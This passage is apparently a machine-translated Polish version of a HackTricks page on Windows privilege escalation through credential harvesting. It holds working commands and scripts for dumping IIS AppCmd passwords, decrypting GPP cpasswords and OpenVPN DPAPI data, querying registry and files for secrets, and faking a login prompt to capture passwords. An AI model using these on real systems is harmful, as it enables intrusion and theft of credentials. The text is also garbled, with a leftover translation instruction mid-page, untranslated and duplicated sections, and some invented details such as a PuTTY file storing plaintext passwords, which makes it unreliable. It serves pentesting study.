- Aktualizowanie systemu operacyjnego i oprogramowania zabezpieczającego w celu zapewnienia najnowszych poprawek i łat.

---

*Więcej informacji na temat technik eskalacji uprawnień w systemie Windows można znaleźć w [Windows Privilege Escalation](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation) na stronie HackTricks.*
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Użyj modułu **Mimikatz** `dpapi::rdg` z odpowiednim `/masterkey`, aby **odszyfrować pliki .rdg**.\
Możesz **wydobyć wiele kluczy głównych DPAPI** z pamięci za pomocą modułu Mimikatz `sekurlsa::dpapi`.

### Notatki samoprzylepne

Ludzie często korzystają z aplikacji StickyNotes na komputerach z systemem Windows, aby **zapisywać hasła** i inne informacje, nie zdając sobie sprawy, że jest to plik bazy danych. Ten plik znajduje się w lokalizacji `C:\Users\<użytkownik>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i zawsze warto go wyszukać i zbadać.

### AppCmd.exe

**Należy zauważyć, że aby odzyskać hasła z AppCmd.exe, musisz być administratorem i uruchomić go z wysokim poziomem uprawnień.**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\
Jeśli ten plik istnieje, istnieje możliwość, że zostały skonfigurowane pewne **poświadczenia**, które można **odzyskać**.

Ten kod został wyodrębniony z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Sprawdź, czy istnieje plik `C:\Windows\CCM\SCClient.exe`.\
Instalatory są uruchamiane z uprawnieniami **SYSTEMU**, wiele z nich jest podatnych na **DLL Sideloading (Informacje z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
### Dane logowania Putty

#### Opis

Putty jest popularnym klientem SSH, który umożliwia zdalne logowanie się do serwerów. Często użytkownicy zapisują swoje dane logowania w plikach konfiguracyjnych Putty, co może prowadzić do wycieku poufnych informacji.

#### Wykrywanie

Aby znaleźć dane logowania Putty, można sprawdzić następujące lokalizacje:

- Plik konfiguracyjny Putty: `C:\Users\<username>\AppData\Roaming\Putty\putty.reg`
- Plik konfiguracyjny Putty: `C:\Users\<username>\AppData\Roaming\Putty\Sessions\Default%20Settings.reg`

#### Wykorzystanie

Po znalezieniu pliku konfiguracyjnego Putty, można otworzyć go w edytorze tekstu i znaleźć dane logowania. Zazwyczaj są one przechowywane w formacie klucz-wartość w sekcji `[HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions]`.

#### Zabezpieczenie

Aby uniknąć wycieku danych logowania Putty, zaleca się:

- Nie zapisywać danych logowania w plikach konfiguracyjnych Putty.
- Używać bezpiecznych metod uwierzytelniania, takich jak klucze SSH, zamiast haseł.
- Regularnie aktualizować klienta Putty, aby korzystać z najnowszych zabezpieczeń.

#### Przykład

Poniżej znajduje się przykład danych logowania Putty w pliku konfiguracyjnym:

```
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\Default%20Settings]
"HostName"="example.com"
"PortNumber"=dword:00000016
"Protocol"="ssh"
"Username"="admin"
"Password"="secretpassword"
```

W powyższym przykładzie, dane logowania to:

- Nazwa hosta: `example.com`
- Numer portu: `22`
- Protokół: `ssh`
- Nazwa użytkownika: `admin`
- Hasło: `secretpassword`
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Klucze hosta SSH Putty

Putty jest popularnym klientem SSH, który umożliwia bezpieczne połączenie z serwerem zdalnym. Podczas pierwszego połączenia z serwerem SSH, Putty generuje i przechowuje klucze hosta w celu weryfikacji tożsamości serwera w przyszłości. Klucze hosta są przechowywane w rejestrze systemu Windows.

Aby zlokalizować klucze hosta SSH Putty, wykonaj następujące kroki:

1. Otwórz edytor rejestru, wpisując "regedit" w menu Start.
2. Przejdź do następującego klucza rejestru: `HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\SshHostKeys`.
3. W tym kluczu znajdziesz podklucze dla każdego serwera, z którym nawiązano połączenie SSH przy użyciu Putty. Każdy podklucz reprezentuje jeden serwer i zawiera informacje o kluczach hosta.

Klucze hosta SSH Putty są przechowywane w postaci wartości w rejestrze. Możesz je wyeksportować do pliku, aby zachować kopię zapasową lub przenieść je na inny komputer. Pamiętaj jednak, że klucze hosta są poufnymi informacjami, które należy chronić przed nieautoryzowanym dostępem.
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Klucze SSH w rejestrze

Prywatne klucze SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, dlatego warto sprawdzić, czy tam znajdują się jakieś interesujące informacje:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Jeśli znajdziesz jakąś pozycję w tej ścieżce, prawdopodobnie będzie to zapisany klucz SSH. Jest on przechowywany w formie zaszyfrowanej, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract).\
Więcej informacji na temat tej techniki można znaleźć tutaj: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Jeśli usługa `ssh-agent` nie jest uruchomiona i chcesz, aby automatycznie uruchamiała się przy starcie systemu, wykonaj:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Wygląda na to, że ta technika już nie jest ważna. Próbowałem utworzyć kilka kluczy ssh, dodać je za pomocą `ssh-add` i zalogować się za pomocą ssh do maszyny. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie zidentyfikował użycia `dpapi.dll` podczas uwierzytelniania klucza asymetrycznego.
{% endhint %}

### Pliki bezobsługowe
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Poniżej znajduje się treść z książki o technikach hakowania. Poniższa treść pochodzi z pliku /hive/hacktricks/windows-hardening/windows-local-privilege-escalation/README.md. Przetłumacz odpowiedni tekst z angielskiego na polski i zwróć tłumaczenie, zachowując dokładnie ten sam składnię markdown i html. Nie tłumaczaj rzeczy takich jak kod, nazwy technik hakowania, słowo hakowanie, nazwy platform chmurowych/SaaS (jak Workspace, aws, gcp...), słowo 'leak', pentesting i znaczniki markdown. Nie dodawaj również żadnych dodatkowych informacji poza tłumaczeniem i składnią markdown.

```
Możesz również wyszukiwać te pliki za pomocą **metasploita**: _post/windows/gather/enum\_unattend_
```
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Kopie zapasowe SAM i SYSTEM

W systemie operacyjnym Windows, pliki SAM i SYSTEM przechowują ważne informacje dotyczące kont użytkowników i konfiguracji systemu. Te pliki są chronione przez system operacyjny i nie można ich bezpośrednio odczytać ani modyfikować. Jednak istnieje sposób na uzyskanie dostępu do tych plików poprzez wykonanie kopii zapasowej.

Kopie zapasowe plików SAM i SYSTEM można znaleźć w folderze `C:\Windows\System32\config\`. Są one przechowywane w folderze `RegBack`. Aby uzyskać dostęp do tych kopii zapasowych, należy wykonać następujące kroki:

1. Otwórz wiersz polecenia jako administrator.
2. Przejdź do folderu `C:\Windows\System32\config\`.
3. Skopiuj pliki `SAM`, `SYSTEM` i `SECURITY` z folderu `RegBack` do bieżącego folderu.
4. Zamknij wiersz polecenia.

Po wykonaniu tych kroków, skopiowane pliki `SAM` i `SYSTEM` będą dostępne do analizy. Można je użyć do próby eskalacji uprawnień lokalnych w systemie Windows.
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Poświadczenia chmury

Cloud credentials, also known as cloud access keys or API keys, are used to authenticate and authorize access to cloud services and resources. These credentials are typically in the form of a pair of access key and secret key.

#### Access Key

The access key is a unique identifier that is used to identify and authenticate the user or application accessing the cloud services. It is similar to a username and is often referred to as the public key.

#### Secret Key

The secret key is a confidential piece of information that is used to verify the authenticity of the access key. It is similar to a password and should be kept secure and not shared with anyone.

#### Best Practices for Managing Cloud Credentials

To ensure the security of your cloud resources, it is important to follow best practices for managing cloud credentials:

1. **Use strong and unique credentials**: Generate strong and unique access keys and secret keys that are not easily guessable. Avoid using default or common credentials provided by the cloud service provider.

2. **Rotate credentials regularly**: Regularly rotate your access keys and secret keys to minimize the risk of unauthorized access. This should be done at least every 90 days or as per your organization's security policies.

3. **Restrict access**: Grant access to cloud resources only to the users or applications that require it. Use the principle of least privilege and implement proper access controls to limit access to sensitive resources.

4. **Securely store credentials**: Store your access keys and secret keys securely. Avoid storing them in plain text or hardcoding them in your applications. Consider using a secure credential management solution or a secrets management service provided by your cloud service provider.

5. **Monitor and audit**: Regularly monitor and audit the usage of your cloud credentials. Enable logging and monitoring features provided by your cloud service provider to detect any suspicious activities or unauthorized access attempts.

By following these best practices, you can help protect your cloud resources from unauthorized access and potential security breaches.
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Wyszukaj plik o nazwie **SiteList.xml**

### Cached GPP Pasword

Wcześniej istniała funkcja umożliwiająca wdrażanie niestandardowych kont lokalnych administratorów na grupie maszyn za pomocą preferencji zasad grupy (GPP). Jednak ta metoda miała poważne luki w zabezpieczeniach. Po pierwsze, obiekty zasad grupy (GPO), przechowywane jako pliki XML w SYSVOL, były dostępne dla każdego użytkownika domeny. Po drugie, hasła w tych GPP, zaszyfrowane za pomocą AES256 przy użyciu publicznie udokumentowanego domyślnego klucza, mogły być odszyfrowane przez dowolnego uwierzytelnionego użytkownika. Stanowiło to poważne zagrożenie, ponieważ mogło umożliwić użytkownikom uzyskanie podwyższonych uprawnień.

Aby zminimalizować to ryzyko, opracowano funkcję skanowania lokalnie buforowanych plików GPP zawierających pole "cpassword", które nie jest puste. Po znalezieniu takiego pliku funkcja deszyfruje hasło i zwraca niestandardowy obiekt PowerShell. Ten obiekt zawiera szczegóły dotyczące GPP i lokalizacji pliku, co ułatwia identyfikację i naprawę tej podatności związanej z bezpieczeństwem.

Wyszukaj w `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (wcześniejsze niż W Vista)_ dla tych plików:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Aby odszyfrować cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Używanie crackmapexec do uzyskania haseł:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Konfiguracja IIS Web

Konfiguracja IIS Web to plik XML, który zawiera ustawienia dla serwera internetowego IIS (Internet Information Services). Ten plik jest używany do konfigurowania różnych aspektów serwera, takich jak ustawienia aplikacji, autoryzacja, uwierzytelnianie, zarządzanie sesjami i wiele innych.

Poniżej przedstawiono kilka przykładów ustawień, które można znaleźć w pliku konfiguracyjnym IIS Web:

#### Ustawienia aplikacji

```xml
<configuration>
  <system.web>
    <compilation debug="true" targetFramework="4.8" />
    <httpRuntime targetFramework="4.8" />
  </system.web>
</configuration>
```

#### Uwierzytelnianie

```xml
<configuration>
  <system.web>
    <authentication mode="Forms">
      <forms loginUrl="/Account/Login" timeout="2880" />
    </authentication>
  </system.web>
</configuration>
```

#### Zarządzanie sesjami

```xml
<configuration>
  <system.web>
    <sessionState mode="InProc" cookieless="false" timeout="20" />
  </system.web>
</configuration>
```

#### Autoryzacja

```xml
<configuration>
  <system.web>
    <authorization>
      <allow roles="Admin" />
      <deny users="*" />
    </authorization>
  </system.web>
</configuration>
```

Pamiętaj, że zmiany w pliku konfiguracyjnym IIS Web mogą mieć wpływ na działanie serwera i aplikacji internetowych. Dlatego zawsze należy zachować ostrożność i wykonać kopię zapasową przed dokonaniem jakichkolwiek zmian.
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Przykład pliku web.config z danymi uwierzytelniającymi:

```xml
<configuration>
  <appSettings>
    <add key="DatabaseUsername" value="admin" />
    <add key="DatabasePassword" value="password123" />
  </appSettings>
</configuration>
```

Ten plik web.config zawiera dane uwierzytelniające w postaci nazwy użytkownika i hasła dla bazy danych.
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Dane logowania OpenVPN

Jeśli masz dostęp do pliku konfiguracyjnego OpenVPN, możesz znaleźć w nim dane logowania, które są wymagane do połączenia się z serwerem VPN. Poniżej znajduje się przykładowy plik konfiguracyjny OpenVPN:

```plaintext
client
dev tun
proto udp
remote vpn.example.com 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
cert client.crt
key client.key
comp-lzo
verb 3
```

W powyższym przykładzie, dane logowania znajdują się w plikach `client.crt` i `client.key`. Aby połączyć się z serwerem VPN, będziesz musiał użyć tych danych logowania.
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Dzienniki

Logs, also known as log files or event logs, are records of events that occur on a computer system or network. They provide valuable information for troubleshooting, monitoring, and auditing purposes. Logs can contain various types of data, such as system events, application events, security events, and user activities.

Dzienniki, znane również jako pliki dziennika lub dzienniki zdarzeń, są zapisem zdarzeń, które występują w systemie komputerowym lub sieci. Zapewniają cenne informacje do celów rozwiązywania problemów, monitorowania i audytu. Dzienniki mogą zawierać różne rodzaje danych, takie jak zdarzenia systemowe, zdarzenia aplikacji, zdarzenia związane z bezpieczeństwem i aktywność użytkowników.

Logs are typically stored in specific locations on the system, such as the Windows Event Log or log files in various directories. They can be accessed and analyzed using tools and techniques designed for log analysis.

Dzienniki są zwykle przechowywane w określonych lokalizacjach na systemie, takich jak Windows Event Log lub pliki dziennika w różnych katalogach. Mogą być dostępne i analizowane za pomocą narzędzi i technik przeznaczonych do analizy dzienników.

Analyzing logs can be useful for identifying security incidents, detecting unauthorized access attempts, troubleshooting system issues, and monitoring user activities. It can also help in identifying potential vulnerabilities and weaknesses in the system.

Analiza dzienników może być przydatna do identyfikacji incydentów związanych z bezpieczeństwem, wykrywania nieautoryzowanych prób dostępu, rozwiązywania problemów systemowych i monitorowania aktywności użytkowników. Może również pomóc w identyfikacji potencjalnych podatności i słabości systemu.
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Poproś o poświadczenia

Zawsze możesz **poprosić użytkownika o podanie swoich poświadczeń lub nawet poświadczeń innego użytkownika**, jeśli uważasz, że może je znać (zauważ, że **bezpośrednie pytanie** klienta o **poświadczenia** jest naprawdę **ryzykowne**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Możliwe nazwy plików zawierających dane uwierzytelniające**

Znane pliki, które jakiś czas temu zawierały **hasła** w **czystym tekście** lub **Base64**.
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Przeszukaj wszystkie proponowane pliki:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Poświadczenia w Koszu

Powinieneś również sprawdzić Kosz, aby znaleźć w nim poświadczenia.

Aby **odzyskać hasła** zapisane przez różne programy, możesz użyć: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru zawierające poświadczenia**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Wyodrębnianie kluczy openssh z rejestru.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądarek

Powinieneś sprawdzić bazy danych, w których przechowywane są hasła z **Chrome'a lub Firefoksa**.\
Sprawdź również historię, zakładki i ulubione przeglądarek, ponieważ tam mogą być przechowywane **hasła**.

Narzędzia do wyodrębniania haseł z przeglądarek:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Nadpisywanie COM DLL**

**Component Object Model (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia **komunikację** między komponentami oprogramowania różnych języków. Każdy komponent COM jest **identyfikowany za pomocą identyfikatora klasy (CLSID)**, a każdy komponent udostępnia funkcjonalność za pomocą jednego lub więcej interfejsów, identyfikowanych za pomocą identyfikatorów interfejsów (IIDs).

Klasy COM i interfejsy są zdefiniowane w rejestrze pod kluczami **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** i **HKEY\_**_**CLASSES\_**_**ROOT\Interface** odpowiednio. Ten rejestr jest tworzony poprzez połączenie kluczy **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

Wewnątrz CLSID tego rejestru można znaleźć podrzędny rejestr **InProcServer32**, który zawiera **wartość domyślną** wskazującą na **DLL** oraz wartość o nazwie **ThreadingModel**, która może być **Apartment** (jednowątkowy), **Free** (wielowątkowy), **Both** (jedno- lub wielowątkowy) lub **Neutral** (wątek neutralny).

![](<../../.gitbook/assets/image (638).png>)

W zasadzie, jeśli możesz **nadpisać dowolne z DLL**, które zostaną wykonane, możesz **podnieść uprawnienia**, jeśli to DLL zostanie wykonane przez innego użytkownika.

Aby dowiedzieć się, jak atakujący wykorzystują przechwytywanie COM jako mechanizm trwałości, sprawdź:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Wyszukiwanie ogólnych haseł w plikach i rejestrze**

**Wyszukaj zawartość plików**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Wyszukiwanie pliku o określonej nazwie**

Aby wyszukać plik o określonej nazwie, możesz skorzystać z polecenia `dir` w wierszu poleceń. Poniżej znajduje się składnia tego polecenia:

```plaintext
dir /s /b "ścieżka_do_folderu\*nazwa_pliku*"
```

Gdzie:
- `/s` oznacza, że polecenie będzie przeszukiwać podfoldery rekurencyjnie.
- `/b` powoduje wyświetlenie tylko ścieżki i nazwy pliku.

Na przykład, jeśli chcesz wyszukać plik o nazwie `example.txt` w folderze `C:\Users\Username`, wykonaj następujące polecenie:

```plaintext
dir /s /b "C:\Users\Username\*example.txt*"
```

Polecenie to wyświetli ścieżkę do pliku `example.txt`, jeśli zostanie znaleziony.
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Wyszukiwanie w rejestrze nazw kluczy i haseł**

Aby znaleźć nazwy kluczy i hasła w rejestrze, możesz skorzystać z narzędzi takich jak `regedit` lub `reg query`. Poniżej przedstawiam kilka przykładów poleceń, które mogą Ci pomóc w przeprowadzeniu takiego wyszukiwania:

- Aby wyszukać nazwy kluczy w rejestrze, użyj polecenia:
```
reg query HKLM /f "nazwa_klucza" /t REG_SZ /s
```
- Aby wyszukać hasła w rejestrze, użyj polecenia:
```
reg query HKCU /f "hasło" /t REG_SZ /s
```

Pamiętaj, że wyszukiwanie w rejestrze może być czasochłonne, więc warto skupić się na konkretnych obszarach, w których mogą znajdować się interesujące Cię informacje.
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Narzędzia do wyszukiwania haseł

[**Wtyczka MSF-Credentials**](https://github.com/carlospolop/MSF-Credentials) **jest wtyczką do msf**, którą stworzyłem, aby **automatycznie wykonywać każdy moduł POST w metasploicie, który wyszukuje poświadczenia** w systemie ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające hasła wymienione na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do wydobywania haseł z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sesje**, **nazwy użytkowników** i **hasła** w kilku narzędziach, które przechowują te dane w postaci tekstowej (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP).
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Wycieki uchwytów

Wyobraź sobie, że **proces działający jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy również nowy proces** (`CreateProcess()`) **z niskimi uprawnieniami, ale dziedzicząc wszystkie otwarte uchwyty głównego procesu**.\
Jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz przechwycić **otwarty uchwyt do utworzonego procesu o uprzywilejowanych uprawnieniach** za pomocą `OpenProcess()` i **wstrzyknąć shellcode**.\
[Aby uzyskać więcej informacji na temat **jak wykryć i wykorzystać tę podatność**, przeczytaj ten przykład.](leaked-handle-exploitation.md)\
[Aby uzyskać **inne informacje na temat testowania i wykorzystywania innych otwartych uchwytów procesów i wątków dziedziczonych z różnymi poziomami uprawnień (nie tylko pełnym dostępem)**, przeczytaj ten **inny post, który zawiera bardziej kompletną wyjaśnienie**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

